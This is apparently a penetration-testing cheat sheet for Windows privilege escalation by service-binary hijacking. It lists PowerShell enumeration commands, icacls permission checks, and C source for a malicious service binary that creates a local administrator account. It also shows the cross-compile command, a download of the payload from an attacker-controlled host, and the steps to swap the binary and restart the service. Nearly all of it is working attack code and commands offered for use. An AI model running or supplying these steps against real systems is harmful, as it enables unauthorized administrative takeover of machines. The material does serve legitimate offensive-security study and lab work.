# Service Hijacking
## Enumerate Services that run on boot
Services from the following paths are not writeable to user:
* C:\Program Files
* C:\Program Files (x86)
* C:\Windows\System32
* C:\Windows\SysWOW64
* C:\ProgramData
* C:\Users\All Users
```powershell
Get-Service | Where-Object { $_.StartType -eq 'Automatic' } | Select-Object Name, Status, StartType
```
```
<insert output here>
```
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
```
<insert output here>
```
## Check interesting service for user writeable permissions
icacls returns the following values related to permissions:
* F - Full access
* M - Modify access
* RX - Read and execute access
* R - Read-only access
* W - Write-only access

BUILTIN\Users or another group the compromised user is in must have (W), (M) or (F) permissions to overwrite the binary (always worth checking if it has "(I)" perm too - it could have inherited the necessary perms from elsewhere):
```powershell
icacls "C:\path\to\interesting\service.exe"
```
```
<insert output here>
```
## Create new malicious service binary
Example malicious service to use:
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
On kali, cross-compile the service:
```batch
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
## Hijack interesting service with a malicious binary
Transfer the service to the target machine:
```powershell
iwr -uri http://$(IP_ADDRESS)/adduser.exe -Outfile adduser.exe
```
Backup the original interesting service:
```powershell
move C:\path\to\interesting\service.exe service.exe
```
Replace service binary with new malicious service:
```powershell
move .\adduser.exe C:\path\to\interesting\service.exe
```
### Restart service
If the user has the appropriate permmissions:
```powershell
net stop $ServiceName
```
```powershell
net start $ServiceName
```
Otherwise, if the service startup type is automatic, the system can be rebooted:
```powershell
shutdown /r /t 0
```
